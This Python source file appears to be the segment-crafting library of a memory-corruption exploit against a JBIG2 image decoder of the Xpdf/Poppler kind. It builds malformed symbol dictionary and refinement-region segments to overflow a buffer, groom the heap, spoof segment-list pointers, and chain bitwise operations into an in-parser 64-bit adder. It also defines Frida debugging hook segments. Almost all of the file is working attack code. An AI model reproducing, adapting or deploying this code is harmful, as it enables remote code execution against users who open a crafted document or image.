import struct
import encoded_bytes
from constants import *


class segmentHeader:
	def __init__(self, seg_num, seg_flags, ref_flags, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack("B", self.ref_flags) + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class segmentHeaderWithRefSegs:
	def __init__(self, seg_num, seg_flags, ref_flags, ref_segs, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.ref_segs = ref_segs
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack("B", self.ref_flags) + \
				self.ref_segs + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class segmentHeaderWithRefSegsLarge:
	def __init__(self, seg_num, seg_flags, ref_flags, ref_segs, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.ref_segs = ref_segs
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack(">I", self.ref_flags) + \
				self.ref_segs + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class symbolDictionarySegment:
	def __init__(self, flags, sd_atx, sd_aty, num_ex_syms, num_new_syms, decoder_bytes):
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.num_ex_syms = num_ex_syms
		self.num_new_syms = num_new_syms
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">H", self.flags) + \
				struct.pack("B", self.sd_atx[0]) + \
				struct.pack("B", self.sd_aty[0]) + \
				struct.pack("B", self.sd_atx[1]) + \
				struct.pack("B", self.sd_aty[1]) + \
				struct.pack("B", self.sd_atx[2]) + \
				struct.pack("B", self.sd_aty[2]) + \
				struct.pack("B", self.sd_atx[3]) + \
				struct.pack("B", self.sd_aty[3]) + \
				struct.pack(">I", self.num_ex_syms) + \
				struct.pack(">I", self.num_new_syms) + \
				self.decoder_bytes


class refAggSymbolDictionarySegment:
	def __init__(self, flags, sd_atx, sd_aty, sdr_atx, sdr_aty, num_ex_syms, num_new_syms, decoder_bytes):
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.sdr_atx = sdr_atx
		self.sdr_aty = sdr_aty
		self.num_ex_syms = num_ex_syms
		self.num_new_syms = num_new_syms
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">H", self.flags) + \
				struct.pack("B", self.sd_atx[0]) + \
				struct.pack("B", self.sd_aty[0]) + \
				struct.pack("B", self.sd_atx[1]) + \
				struct.pack("B", self.sd_aty[1]) + \
				struct.pack("B", self.sd_atx[2]) + \
				struct.pack("B", self.sd_aty[2]) + \
				struct.pack("B", self.sd_atx[3]) + \
				struct.pack("B", self.sd_aty[3]) + \
				struct.pack("B", self.sdr_atx[0]) + \
				struct.pack("B", self.sdr_aty[0]) + \
				struct.pack("B", self.sdr_atx[1]) + \
				struct.pack("B", self.sdr_aty[1]) + \
				struct.pack(">I", self.num_ex_syms) + \
				struct.pack(">I", self.num_new_syms) + \
				self.decoder_bytes


class pageInfoSegment:
	def __init__(self, page_w, page_h, x_res, y_res, flags, striping):
		self.page_w = page_w
		self.page_h = page_h
		self.x_res = x_res
		self.y_res = y_res
		self.flags = flags
		self.striping = striping

	def raw(self):
		return  struct.pack(">I", self.page_w) + \
				struct.pack(">I", self.page_h) + \
				struct.pack(">I", self.x_res) + \
				struct.pack(">I", self.y_res) + \
				struct.pack("B", self.flags) + \
				struct.pack(">H", self.striping)


class textRegionSegment:
	def __init__(self, w, h, x, y, seg_info_flags, flags, num_instances, decoder_bytes):
		self.w = w
		self.h = h
		self.x = x
		self.y = y
		self.seg_info_flags = seg_info_flags
		self.flags = flags
		self.num_instances = num_instances
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">I", self.w) + \
				struct.pack(">I", self.h) + \
				struct.pack(">I", self.x) + \
				struct.pack(">I", self.y) + \
				struct.pack("B", self.seg_info_flags) + \
				struct.pack(">H", self.flags) + \
				struct.pack(">I", self.num_instances) + \
				self.decoder_bytes


class genericRefinementRegionSegment:
	def __init__(self, w, h, x, y, seg_info_flags, flags, sd_atx, sd_aty, decoder_bytes):
		self.w = w
		self.h = h
		self.x = x
		self.y = y
		self.seg_info_flags = seg_info_flags
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.decoder_bytes = decoder_bytes
	
	def raw(self):
		if self.flags & 1 == 1:
			# templ on, atx/aty not read
			return  struct.pack(">I", self.w) + \
				struct.pack(">I", self.h) + \
				struct.pack(">I", self.x) + \
				struct.pack(">I", self.y) + \
				struct.pack("B", self.seg_info_flags) + \
				struct.pack("B", self.flags) + \
				self.decoder_bytes
		else:
			b = struct.pack(">I", self.w) + \
				struct.pack(">I", self.h) + \
				struct.pack(">I", self.x) + \
				struct.pack(">I", self.y) + \
				struct.pack("B", self.seg_info_flags) + \
				struct.pack("B", self.flags)
			for i in range(len(self.sd_atx)):
				b += struct.pack("b", self.sd_atx[i]) + \
				struct.pack("b", self.sd_aty[i])
				
			return b + self.decoder_bytes


def negative(v):
	# convert a value to twoso compliment
	return ((~v) & 0xFFFFFFFFFFFFFFFF) + 1


def create_consume_placeholder_bytes():
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, REPLACE, 2, [0,0], [0,0], encoded_bytes.encoded_0_bit)
	grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", placeholder_segnum), 1, len(grrs.raw()))
	return grrs_sh.raw() + grrs.raw()


def create_add_placeholder_bytes():
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], encoded_bytes.encoded_1_bit)
	grrs_sh = segmentHeader(placeholder_segnum, STORE, 0, 1, len(grrs.raw()))
	return grrs_sh.raw() + grrs.raw()


def insert_register_into_segments(f, input_reg):
	# as written this is callable once, would need to reduce the amount of bits written
	# to call this again

	# the last pointer in the list will now be overwritten as it moves up the list
	# the last 3 of the lower 32 bits don't need to be written because of alignment, 
	# they will always be 0. The upper 32 bits don't need to be changed. Write lower 31 anyway

	for i in range(0, 0x1f):
		# consume placeholders, store bits of buffer address
		f.write(create_consume_placeholder_bytes())

		# reading insertion pointer bits 
		grrs = genericRefinementRegionSegment(0x1, 0x1, 
					((input_reg + 3 - (i // 8)) << 3) + (i % 8),
					0, 0, 2, [0,0], [0,0], encoded_bytes.encoded_1_bit)
		grrs_sh = segmentHeader(0xcafe + i, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

	# append segment (brings list up to 0x20), will overwrite this pointer in the segment list
	f.write(create_add_placeholder_bytes())

	for i in range(0, 0x1f):
		# write insertion pointer bits into list one bit at a time as it's moving down the list
		grrs = genericRefinementRegionSegment(0x1, 0x1, 
					(((data_buffer_to_segments + (0x8 * (0x1f - i))) + 3 - (i // 8) ) << 3) + (i % 8), 
					0, REPLACE, 2, [0,0], [0,0], encoded_bytes.encoded_1_bit)
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xcafe + i), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

		if i == 0x1e:
			# now that our spoofed segment has been written into segments, remove 1 placeholder
			break
		# restore a placeholder
		f.write(create_add_placeholder_bytes())


def create_page_info_bytes(size, segnum=0xffffffff):
	"""
	Creates pageInfoSegment with a size bytes allocation for data
	JBIG2Bitmap::JBIG2Bitmap(Guint segNumA, int wA, int hA):
	  JBIG2Segment(segNumA)
	{
	  w = wA;
	  h = hA;
      line = (wA + 7) >> 3;
	  ...
	  data = (Guchar *)gmalloc(h * line + 1);
	"""
	pis = pageInfoSegment(max(((size - 1) << 3) - 7, 1), 1, 0, 0, 0, 0)
	pis_sh = segmentHeader(segnum, PAGE, 0, 1, len(pis.raw()))
	return pis_sh.raw() + pis.raw()


def create_default_sds(numsyms, decoder_bytes):
	return symbolDictionarySegment(
			0, # default flags 
			[0x03,0xFD,0x02,0xFE], # default atx
			[0xFF,0xFF,0xFE,0xFE], # default aty
			numsyms, 
			numsyms, 
			decoder_bytes
		)


def create_segments_and_bitmap_corruption_sds():
	return create_default_sds(
		((data_buffer_to_bitmap - data_buffer_to_syms) // 8) + 3, # distance to bitmap, 3 extra to corrupt h  
		encoded_bytes.overflow_sds_0x27_1x1_bitmaps
	)


def create_0xffff_sds():
	return create_default_sds(
		0xffff,
		encoded_bytes.overflow_sds_0xffff_1x1_bitmaps
	)


def create_heap_feng_shui_0x80_0x80_0x40_0x90_sds():
	return create_default_sds(
		0x4,
		encoded_bytes.heap_feng_shui_0x80_0x80_0x40_0x90
	)

def create_0x1_sds():
	return create_default_sds(
		0x1,
		encoded_bytes.overflow_sds_0x1_1x1_bitmaps
	)


def or_bytes_at_offset(f, offset, bytez):
	op_bytes_at_offset(f, OR, offset, bytez)


def and_bytes_at_offset(f, offset, bytez):
	op_bytes_at_offset(f, AND, offset, bytez)


def xor_bytes_at_offset(f, offset, bytez):
	op_bytes_at_offset(f, XOR, offset, bytez)


def xnor_bytes_at_offset(f, offset, bytez):
	op_bytes_at_offset(f, XNOR, offset, bytez)


def replace_bytes_at_offset(f, offset, bytez):
	op_bytes_at_offset(f, REPLACE, offset, bytez)


def op_bytes_at_offset(f, op, offset, bytez):
	bits = 0
	for byte in bytez:
		for bit in format(byte, "08b"):
			# encode 1 bit
			data_bytes = encoded_bytes.encoded_1_bit
			if bit == "0":
				# encode 0 bit
				data_bytes = encoded_bytes.encoded_0_bit

			# w, h, x, y, seg_info_flags, flags, sd_atx, sd_aty, decoder_bytes)
			grrs = genericRefinementRegionSegment(0x1, 0x1, (offset << 3) + bits, 0, op, 0, [0,0], [0,0], data_bytes)
			grrs_sh = segmentHeader(0xffffffff, COMBINE, 0, 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())
			bits += 1


def or_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bytes_offset_to_offset(f, OR, dst_offset, src_offset, size)


def and_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bytes_offset_to_offset(f, AND, dst_offset, src_offset, size)


def xor_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bytes_offset_to_offset(f, XOR, dst_offset, src_offset, size)


def xnor_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bytes_offset_to_offset(f, XNOR, dst_offset, src_offset, size)


def replace_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bytes_offset_to_offset(f, REPLACE, dst_offset, src_offset, size)


def or_bits_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bits_offset_to_offset(f, OR, dst_offset, src_offset, size)


def and_bits_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bits_offset_to_offset(f, AND, dst_offset, src_offset, size)


def xor_bits_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bits_offset_to_offset(f, XOR, dst_offset, src_offset, size)


def xnor_bits_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bits_offset_to_offset(f, XNOR, dst_offset, src_offset, size)


def replace_bits_offset_to_offset(f, dst_offset, src_offset, size = 1):
	op_bits_offset_to_offset(f, REPLACE, dst_offset, src_offset, size)


def op_bytes_offset_to_offset(f, op, write_byte_offset, read_byte_offset, num_bytes):
	op_bits_offset_to_offset(f, op, write_byte_offset << 3, read_byte_offset << 3, num_bytes << 3)


def op_bits_offset_to_offset(f, op, write_bit_offset, read_bit_offset, num_bits):
	for i in range(num_bits):
		grrs = genericRefinementRegionSegment(0x1, 0x1, read_bit_offset + i, 0, 0, 2, [0,0], [0,0], encoded_bytes.encoded_1_bit)
		grrs_sh = segmentHeader(op_segnum, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
		grrs = genericRefinementRegionSegment(0x1, 0x1, write_bit_offset + i, 0, op, 2, [0,0], [0,0], encoded_bytes.encoded_1_bit)
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", op_segnum), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())


def zero_8_bytes(f, offset):
	replace_bytes_at_offset(f, offset, struct.pack("<Q", 0))


def zero_register(f, offset):
	zero_8_bytes(f, offset)


def zero_all_register(f):
	zero_8_bytes(f, rax)
	zero_8_bytes(f, rbx)
	zero_8_bytes(f, rcx)
	zero_8_bytes(f, rdx)


def add64(f, dst, src):
	"""
	XOR:	._____________.
			| A | B | Out |
			+-------------+
			| 0 | 0 |  0  |
			| 0 | 1 |  1  |
			| 1 | 0 |  1  |
			| 1 | 1 |  0  |
			+-------------+
	AND:	._____________.
			| A | B | Out |
			+-------------+
			| 0 | 0 |  0  |
			| 0 | 1 |  0  |
			| 1 | 0 |  0  |
			| 1 | 1 |  1  |
			+-------------+
	"""
	zero_8_bytes(f, flags)
	for i in range(0, 0x40):
		src_bit = ((src + i // 8) << 3) + (7 - (i % 8))
		dst_bit = ((dst + i // 8) << 3) + (7 - (i % 8))
		# first half adder 
		"""
		b1 XOR b2 = carry
		b1 AND b2 = sum
		"""
		replace_bits_offset_to_offset(f, sum_half_adder_bit, dst_bit)
		xor_bits_offset_to_offset(f, sum_half_adder_bit, src_bit)

		replace_bits_offset_to_offset(f, carry_half_adder_bit, dst_bit)
		and_bits_offset_to_offset(f, carry_half_adder_bit, src_bit)

		# second half adder
		"""
		sum XOR carry_in = sum
		b1 AND b2 = carry
		"""
		replace_bits_offset_to_offset(f, dst_bit, sum_half_adder_bit)
		xor_bits_offset_to_offset(f, dst_bit, carry_bit)

		and_bits_offset_to_offset(f, carry_bit, sum_half_adder_bit)
		# get carry out for next op
		or_bits_offset_to_offset(f, carry_bit, carry_half_adder_bit)


def discard_segment(f, seg_num):
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, REPLACE, 2, [0,0], [0,0], encoded_bytes.encoded_1_bit)
	grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", seg_num), 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())


def flush_overflow_segments(f):
	# list at this point has 0x11 items in it, all of which were corrupted during the overflow
	# the segment used to overwrite this has a segnum of 0
	for i in range(0, 0x11):
		# swap in 0x11 placeholders
		# refactor TODO: encoded bytes differ, replace with create_add..
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], encoded_bytes.encoded_0_bit)
		grrs_sh = segmentHeader(placeholder_segnum, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
	
		# consume segnum 0x00, which was written during the overflow
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, AND, 2, [0,0], [0,0], encoded_bytes.encoded_0_bit)
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0x0), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

	for i in range(0x11, 0x1f):
		# fill the rest of the list with placeholders
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], encoded_bytes.encoded_0_bit)
		grrs_sh = segmentHeader(placeholder_segnum, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
	# list is now 0x1f long, one segment left to do offset reads. Must not exceed 0x20 or the list will resize (reallocate)

###################################################################
# Debugging NOP segments used to trigger frida hook functionality #
###################################################################
print_bitmap_sh = segmentHeader(0xffffffff, 0x1, 0, 1, 0)
print_segments_sh = segmentHeader(0xffffffff, 0x2, 0, 1, 0)
pause_execution_sh = segmentHeader(0xffffffff, 0x3, 0, 1, 0)
ad_hoc_sh = segmentHeader(0xffffffff, 0x8, 0, 1, 0)
ad_hoc_9_sh = segmentHeader(0xffffffff, 0x9, 0, 1, 0)
ad_hoc_10_sh = segmentHeader(0xffffffff, 10, 0, 1, 0)
ad_hoc_11_sh = segmentHeader(0xffffffff, 11, 0, 1, 0)
ad_hoc_12_sh = segmentHeader(0xffffffff, 12, 0, 1, 0)
ad_hoc_13_sh = segmentHeader(0xffffffff, 13, 0, 1, 0)
ad_hoc_14_sh = segmentHeader(0xffffffff, 14, 0, 1, 0)
ad_hoc_15_sh = segmentHeader(0xffffffff, 15, 0, 1, 0)
ad_hoc_54_sh = segmentHeader(0xffffffff, 54, 0, 1, 0)
ad_hoc_55_sh = segmentHeader(0xffffffff, 55, 0, 1, 0)
ad_hoc_56_sh = segmentHeader(0xffffffff, 56, 0, 1, 0)
ad_hoc_57_sh = segmentHeader(0xffffffff, 57, 0, 1, 0)
ad_hoc_58_sh = segmentHeader(0xffffffff, 58, 0, 1, 0)
ad_hoc_59_sh = segmentHeader(0xffffffff, 59, 0, 1, 0)
ad_hoc_61_sh = segmentHeader(0xffffffff, 61, 0, 1, 0)
ad_hoc_60_sh = segmentHeader(0xffffffff, 60, 0, 1, 0)
ad_hoc_63_sh = segmentHeader(0xffffffff, 63, 0, 1, 0)
ad_hoc_70_sh = segmentHeader(0xffffffff, 70, 0, 1, 0)
ad_hoc_71_sh = segmentHeader(0xffffffff, 71, 0, 1, 0)
ad_hoc_72_sh = segmentHeader(0xffffffff, 72, 0, 1, 0)
ad_hoc_73_sh = segmentHeader(0xffffffff, 73, 0, 1, 0)
debug_sh = segmentHeader(0xffffffff, 0x34, 0, 1, 0)
spoof_unbound_sh = segmentHeader(0xffffffff, 0x3E, 0, 1, 0)
toggle_debug_sh = segmentHeader(0xffffffff, 0x32, 0, 1, 0)
